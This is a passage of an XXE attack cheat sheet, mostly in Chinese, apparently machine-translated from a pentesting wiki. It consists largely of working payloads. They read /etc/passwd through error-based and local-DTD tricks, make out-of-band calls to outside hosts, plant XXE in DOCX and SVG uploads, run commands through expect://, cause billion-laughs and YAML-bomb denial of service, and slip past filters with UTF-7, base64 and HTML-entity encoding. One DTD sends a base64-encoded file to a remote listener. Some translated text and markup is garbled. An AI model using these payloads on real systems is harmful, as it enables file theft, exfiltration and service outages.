<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/local/app/schema.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % custom_entity &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>此 DTD 执行以下步骤：</p>
<ul>
<li>定义一个名为 <code>local_dtd</code> 的 XML 参数实体，包含存在于服务器文件系统上的外部 DTD 文件的内容。</li>
<li>重新定义名为“custom_entity”的 XML 参数实体，该实体已在外部 DTD 文件中定义。该实体被重新定义为包含 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages">基于错误的 XXE 漏洞利用</a>已经描述过，用于触发包含 <code>/etc/passwd</code> 文件内容的错误消息。</li>
<li>使用 <code>local_dtd</code> 实体，以便解释外部 DTD，包括 <code>custom_entity</code> 实体的重新定义值。这会产生所需的错误消息。</li>
</ul>
<p><strong>真实示例：</strong> 使用 GNOME 桌面环境的系统通常在 <code>/usr/share/yelp/dtd/docbookx.dtd</code> 有一个 DTD，其中包含一个名为 <code>ISOamso</code> 的实体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(224).png"></p>
<p>由于此技术使用<strong>内部 DTD，因此您需要先找到一个有效的 DTD</strong>。您可以这样做<strong>安装</strong>服务器正在使用的相同<strong>OS&#x2F;软件</strong>并<strong>搜索一些默认DTD</strong>，或<strong>获取系统内</strong>默认DTD<strong>的列表</strong>和<strong>检查</strong>是否存在：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="定位系统内置的-DTD-文件"><a href="#定位系统内置的-DTD-文件" class="headerlink" title="定位系统内置的 DTD 文件"></a>定位系统内置的 DTD 文件</h3><p>可在以下 github 存储库中，您可以找到<strong>系统中可能存在的 DTD 路径</strong>：</p>
<p>url&#x3D;”<a target="_blank" rel="noopener" href="https://github.com/GoSecure/dtd-finder/tree/master/list&quot;">https://github.com/GoSecure/dtd-finder/tree/master/list&quot;</a></p>
<p>如果拥有与目标系统同一个 Docker 镜像文件，可以尝试使用下面的工具在该镜像内找到内置的 DTD 文件：<a target="_blank" rel="noopener" href="https://github.com/GoSecure/dtd-finder">Readme of the github</a> </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar</span><br><span class="line"></span><br><span class="line">Scanning TAR file /tmp/dadocker.tar</span><br><span class="line"></span><br><span class="line"> [=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd</span><br><span class="line">Testing 0 entities : []</span><br><span class="line"></span><br><span class="line"> [=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd</span><br><span class="line">Testing 0 entities : []</span><br></pre></td></tr></table></figure>

<h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a target="_blank" rel="noopener" href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后它们会从中解析出一些细节。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>解析至少一个 XML 文件</strong>。<br>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。首先，创建一个空目录来解压你的文档，然后解压！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>

<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
<p>剩下的就是<strong>压缩文件以创建邪恶的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
<p>现在将文件上传到您的（希望如此）易受攻击的 Web 应用程序，并在 Burp Collaborator 日志中向黑客之神祈祷。</p>
<h3 id="Jar-protocol"><a href="#Jar-protocol" class="headerlink" title="Jar: protocol"></a>Jar: protocol</h3><p><code>jar</code> 协议仅适用于 <strong>Java 应用程序</strong>。它允许访问 <strong>PKZIP</strong>文件（<code>.zip</code>、<code>.jar</code>、…）中的文件，并适用于本地和远程文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar:file:///var/myarchive.zip!/file.txt</span><br><span class="line">jar:https://download.host.com/myarchive.zip!/file.txt</span><br></pre></td></tr></table></figure>

<p>hint style&#x3D;”danger”<br>能够访问 PKZIP 文件中的文件对于通过系统 DTD 文件滥用 XXE 非常有用。**检查 [此部分以了解如何滥用系统 DTD 文件](xxe-xee-xml-external-entity.md#基于错误的系统-dtd）。<br>endhint </p>
<h4 id="Behind-the-scenes"><a href="#Behind-the-scenes" class="headerlink" title="Behind the scenes"></a>Behind the scenes</h4><ol>
<li>它发出 HTTP 请求以加载 zip 存档。 <code>https://download.host.com/myarchive.zip</code></li>
<li>它将 HTTP 响应保存到一个临时位置。 <code>/tmp/...</code></li>
<li>它提取档案。</li>
<li>它读取<code>file.zip</code></li>
<li>它删除临时文件。</li>
</ol>
<p>请注意，可以在第二步中停止流程。诀窍是在提供文件时永远不要关闭连接。 <a target="_blank" rel="noopener" href="https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution">这个工具很有用</a>：一个在python<code>slow_http_server.py</code>和一个在java<code>slowserver。罐子</code>。</p>
<p>一旦服务器下载了你的文件，你需要通过浏览临时目录来找到它的位置。由于是随机的，因此无法提前预测文件路径。<br><img src="https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png" alt="Jar"></p>
<p>hint style&#x3D;”danger”<br>在临时目录中写入文件有助于<strong>升级另一个涉及路径遍历的漏洞</strong>（例如本地文件包含、模板注入、XSLT RCE、反序列化等）。<br>endhint </p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(1)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h3><h4 id="Billion-Laugh-Attack"><a href="#Billion-Laugh-Attack" class="headerlink" title="Billion Laugh Attack"></a>Billion Laugh Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a4;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Yaml-Attack"><a href="#Yaml-Attack" class="headerlink" title="Yaml Attack"></a>Yaml Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a: &amp;a [&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;]</span><br><span class="line">b: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a]</span><br><span class="line">c: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]</span><br><span class="line">d: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c]</span><br><span class="line">e: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d]</span><br><span class="line">f: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e]</span><br><span class="line">g: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f]</span><br><span class="line">h: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g]</span><br><span class="line">i: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]</span><br></pre></td></tr></table></figure>

<h4 id="二次爆炸攻击"><a href="#二次爆炸攻击" class="headerlink" title="二次爆炸攻击"></a>二次爆炸攻击</h4><p><img src="/../.gitbook/assets/image%20(531).png"></p>
<h2 id="Hidden-XXE-Surfaces"><a href="#Hidden-XXE-Surfaces" class="headerlink" title="Hidden XXE Surfaces"></a>Hidden XXE Surfaces</h2><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">From here.</a></p>
<p>一些应用程序<strong>接收客户端提交的数据，在服务器端将其嵌入到 XML 文档中，然后解析文档</strong>。当客户端提交的数据被放入一个<strong>后端 SOAP 请求</strong>，然后由后端 SOAP 服务处理时，就会出现这种情况。<br>在这种情况下，您无法执行经典的 XXE 攻击，因为<strong>您无法控制整个 XML</strong>文档，因此无法定义或修改 <code>DOCTYPE</code> 元素。但是，您也许可以使用 <code>XInclude</code> 代替。 <code>XInclude</code> 是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以在 XML 文档中的任何数据值中放置“XInclude”攻击，因此可以在您仅控制放置在服务器端 XML 文档中的单个数据项的情况下执行攻击。<br>要执行 <code>XInclude</code> 攻击，您需要引用 <code>XInclude</code> 命名空间并提供您希望包含的文件的路径。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">productId=&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;&amp;storeId=1</span><br></pre></td></tr></table></figure>

<h3 id="SVG-File-Upload"><a href="#SVG-File-Upload" class="headerlink" title="SVG - File Upload"></a>SVG - File Upload</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">From here.</a></p>
<p>一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式的示例有 DOCX 等办公文档格式和 SVG 等图像格式。<br>例如，应用程序可能允许用户<strong>上传图像</strong>，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收像 PNG 或 JPEG 这样的格式，<strong>正在使用的图像处理库也可能支持 SVG 图像</strong>。由于 SVG 格式使用 XML，攻击者可以提交恶意 SVG 图像，从而达到 XXE 漏洞的隐藏攻击面。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;&lt;image xlink:href=&quot;file:///etc/hostname&quot;&gt;&lt;/image&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>You could also try to <strong>execute commands</strong> using the PHP “expect” wrapper:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;</span><br><span class="line">    &lt;image xlink:href=&quot;expect://ls&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注意读取文件或执行结果的第一行将出现在创建的图像内。因此，您需要能够访问 SVG 创建的图像。</strong></p>
<h3 id="PDF-File-upload"><a href="#PDF-File-upload" class="headerlink" title="PDF - File upload"></a><strong>PDF - File upload</strong></h3><p>Read the following post to <strong>learn how to exploit a XXE uploading a PDF</strong> file:</p>
<p>content-ref url&#x3D;”file-upload&#x2F;pdf-upload-xxe-and-cors-bypass.md”<br><a href="file-upload/pdf-upload-xxe-and-cors-bypass.md">pdf-upload-xxe-and-cors-bypass.md</a><br>endcontent-ref </p>
<h3 id="Content-Type-From-x-www-urlencoded-to-XML"><a href="#Content-Type-From-x-www-urlencoded-to-XML" class="headerlink" title="Content-Type: From x-www-urlencoded to XML"></a>Content-Type: From x-www-urlencoded to XML</h3><p>如果 POST 请求接受 XML 格式的数据，您可以尝试在该请求中利用 XXE。例如，如果一个正常的请求包含以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">foo=bar</span><br></pre></td></tr></table></figure>

<p>Then you might be able submit the following request, with the same result:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 52</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Content-Type-From-JSON-to-XEE"><a href="#Content-Type-From-JSON-to-XEE" class="headerlink" title="Content-Type: From JSON to XEE"></a>Content-Type: From JSON to XEE</h3><p>To change the request you could use a Burp Extension named “<strong>Content Type Converter</strong>“. <a target="_blank" rel="noopener" href="https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html">Here</a> you can find this example:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line"></span><br><span class="line">&#123;&quot;root&quot;: &#123;&quot;root&quot;: &#123;</span><br><span class="line">  &quot;firstName&quot;: &quot;Avinash&quot;,</span><br><span class="line">  &quot;lastName&quot;: &quot;&quot;,</span><br><span class="line">  &quot;country&quot;: &quot;United States&quot;,</span><br><span class="line">  &quot;city&quot;: &quot;ddd&quot;,</span><br><span class="line">  &quot;postalCode&quot;: &quot;ddd&quot;</span><br><span class="line">&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM &quot;http://34.229.92.127:8000/TEST.ext&quot; &gt;]&gt; </span><br><span class="line">&lt;root&gt;</span><br><span class="line"> &lt;root&gt;</span><br><span class="line">  &lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;</span><br><span class="line">  &lt;lastName/&gt;</span><br><span class="line">  &lt;country&gt;United States&lt;/country&gt;</span><br><span class="line">  &lt;city&gt;ddd&lt;/city&gt;</span><br><span class="line">  &lt;postalCode&gt;ddd&lt;/postalCode&gt;</span><br><span class="line"> &lt;/root&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>Another example can be found <a target="_blank" rel="noopener" href="https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2">here</a>.</p>
<h2 id="WAF-amp-Protections-Bypasses"><a href="#WAF-amp-Protections-Bypasses" class="headerlink" title="WAF &amp; Protections Bypasses"></a>WAF &amp; Protections Bypasses</h2><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt; %init; ]&gt;&lt;foo/&gt;</span><br></pre></td></tr></table></figure>

<p>This only work if the XML server accepts the <code>data://</code> protocol.</p>
<h3 id="UTF-7"><a href="#UTF-7" class="headerlink" title="UTF-7"></a>UTF-7</h3><p>You can use the [<strong>“Encode Recipe</strong>“ of cyberchef here ]([<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7">https://gchq.github.io/CyberChef/#recipe=Encode_text%28’UTF-7</a> %2865000%29’%29&amp;input&#x3D;PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to](<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to">https://gchq.github.io/CyberChef/#recipe=Encode_text%28’UTF-7 %2865000%29’%29&amp;input&#x3D;PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to</a>) transform to UTF-7.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?--&gt;</span><br><span class="line">+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;</span><br><span class="line">+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4</span><br><span class="line">+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+</span><br><span class="line">+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4</span><br></pre></td></tr></table></figure>

<h3 id="File-x2F-Protocol-Bypass"><a href="#File-x2F-Protocol-Bypass" class="headerlink" title="File:&#x2F; Protocol Bypass"></a>File:&#x2F; Protocol Bypass</h3><p>If the web is using PHP, instead of using <code>file:/</code> you can use <strong>php wrappers</strong><code>php://filter/convert.base64-encode/resource=</code> to <strong>access internal files</strong>.</p>
<p>If the web is using Java you may check the <a href="xxe-xee-xml-external-entity.md#jar-protocol"><strong>jar: protocol</strong></a>.</p>
<h3 id="HTML-Entities"><a href="#HTML-Entities" class="headerlink" title="HTML Entities"></a>HTML Entities</h3><p>Trick from <a target="_blank" rel="noopener" href="https://github.com/Ambrotd/XXE-Notes"><strong>https://github.com/Ambrotd/XXE-Notes</strong></a><br>You can create an <strong>entity inside an entity</strong> encoding it with <strong>html entities</strong> and then call it to <strong>load a dtd</strong>.<br>Note that the <strong>HTML Entities</strong> used needs to be <strong>numeric</strong> (like [in this example](<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C">https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,’Numeric entities’%29&amp;input&#x3D;PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\</a>).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % a &quot;&amp;#x3C;&amp;#x21;&amp;#x45;&amp;#x4E;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4D;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x6F;&amp;#x75;&amp;#x72;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x65;&amp;#x72;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6D;&amp;#x2F;&amp;#x62;&amp;#x79;&amp;#x70;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x2E;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x20;&amp;#x3E;&quot; &gt;%a;%dtd;]&gt;</span><br><span class="line">&lt;data&gt;</span><br><span class="line">    &lt;env&gt;&amp;exfil;&lt;/env&gt;</span><br><span class="line">&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>DTD example:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % abt &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://172.17.0.1:7878/bypass.xml?%data;&#x27;&gt;&quot;&gt;</span><br><span class="line">%abt;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>

